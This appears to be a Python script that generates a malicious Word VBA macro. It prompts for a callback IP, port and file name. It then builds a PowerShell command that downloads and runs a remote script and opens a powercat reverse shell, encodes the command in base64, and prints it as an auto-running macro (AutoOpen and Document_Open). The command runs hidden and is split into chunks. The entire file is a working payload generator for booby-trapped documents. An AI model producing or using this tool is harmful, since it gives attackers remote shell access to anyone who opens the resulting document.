import base64

def chunkCommandMaker(ip, port, file_name):
	the_payload = "IEX(New-Object System.Net.WebClient).DownloadString('http://" + ip + "/" + file_name + "');powercat -c " + ip + " -p " + port + " -e powershell"
	
	utf_16_le_payload = the_payload.encode("utf-16-le")
	base64_encoded_bit = base64.encodebytes(utf_16_le_payload).decode('utf-8').replace("\n", "")
	print("\n\nBase64 Blob:\n" + base64_encoded_bit + "\n\n")
	embedded_command = "powershell.exe -nop -w hidden -e " + base64_encoded_bit
	chunk_size = 50

	print("VBA Macro:\nSub AutoOpen()\n\tMyMacro\nEnd Sub\n\nSub Document_Open()\n\tMyMacro\nEnd Sub\n\nSub MyMacro()\n\tDim Str As String")

	for i in range(0, len(embedded_command), chunk_size):
		print("\tStr = Str + " + '"' + embedded_command[i:i+chunk_size] + '"')
	print('\tCreateObject("Wscript.Shell").Run Str\nEnd Sub\n')
		
ask_ip = input("Callback IP: ")
ask_port = input("Callback Port: ")
ask_file = input("File being Pulled (ex: powercat.ps1) ")

try:
	chunkCommandMaker(ask_ip, ask_port, ask_file)
except:
	print("Something went wrong")
